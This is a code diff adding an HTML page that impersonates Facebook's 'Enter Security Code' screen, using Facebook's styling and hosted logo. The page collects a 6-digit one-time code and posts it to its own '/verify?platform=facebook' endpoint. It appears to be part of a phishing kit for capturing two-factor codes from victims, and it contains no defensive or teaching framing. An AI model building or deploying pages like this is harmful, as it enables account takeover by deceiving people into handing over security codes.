@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Enter Security Code • Facebook</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+        }
+        .header {
+            padding-bottom: 16px;
+            margin-bottom: 16px;
+            border-bottom: 1px solid #dddfe2;
+        }
+        .logo {
+            width: 112px;
+            margin-bottom: 16px;
+        }
+        h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .subtitle {
+            color: #65676b;
+            font-size: 15px;
+            line-height: 1.4;
+        }
+        .code-info {
+            background-color: #f0f2f5;
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        .otp-form {
+            margin-top: 24px;
+        }
+        .input-group {
+            margin-bottom: 16px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 15px;
+            color: #1c1e21;
+            margin-bottom: 8px;
+        }
+        .otp-input {
+            width: 100%;
+            max-width: 300px;
+            height: 40px;
+            padding: 0 8px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 15px;
+            color: #1c1e21;
+        }
+        .otp-input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .actions {
+            display: flex;
+            justify-content: flex-start;
+            gap: 12px;
+            margin-top: 24px;
+        }
+        .continue-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .continue-btn:hover {
+            background-color: #166fe5;
+        }
+        .cancel-btn {
+            background-color: #e4e6eb;
+            color: #1c1e21;
+            border: none;
+            border-radius: 6px;
+            padding: 8px 16px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+        }
+        .cancel-btn:hover {
+            background-color: #d8dadf;
+        }
+        .help-text {
+            margin-top: 16px;
+            font-size: 13px;
+            color: #65676b;
+        }
+        .help-text a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .help-text a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook" class="logo">
+            <h1>Enter Security Code</h1>
+            <p class="subtitle">Please check your email for a message with your code. Your code is 6 numbers long.</p>
+        </div>
+        <div class="code-info">
+            We sent your code to:<br>
+            <strong id="masked-email"></strong>
+        </div>
+        <form class="otp-form" method="POST" action="/verify?platform=facebook">
+            <div class="input-group">
+                <label for="otp">Enter 6-digit code</label>
+                <input type="text" id="otp" name="otp" class="otp-input" required pattern="[0-9]{6}" maxlength="6" inputmode="numeric" autocomplete="one-time-code">
+            </div>
+            <div class="actions">
+                <button type="submit" class="continue-btn">Continue</button>
+                <button type="button" class="cancel-btn">Cancel</button>
+            </div>
+        </form>
+        <p class="help-text">
+            Didn't get a code? <a href="#">Resend Code</a><br>
+            <a href="#">Try another way</a>
+        </p>
+    </div>
+    <script>
+        // Mask the email address
+        const email = localStorage.getItem('user_email') || 'your email';
+        const maskedEmail = email.replace(/(\w{2})[\w.-]+@([\w.]+)/, '$1***@$2');
+        document.getElementById('masked-email').textContent = maskedEmail;
+
+        // Handle numeric input only
+        const otpInput = document.getElementById('otp');
+        otpInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // Handle form submission
+        document.querySelector('.otp-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            fetch('/verify?platform=facebook', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ otp: otpInput.value })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data.status === 'success' && data.redirect_url) {
+                    window.location.href = data.redirect_url;
+                } else {
+                    throw new Error(data.error || 'Unknown error occurred');
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+
+        // Handle cancel button
+        document.querySelector('.cancel-btn').addEventListener('click', function() {
+            window.history.back();
+        });
+    </script>
+</body>
+</html> 
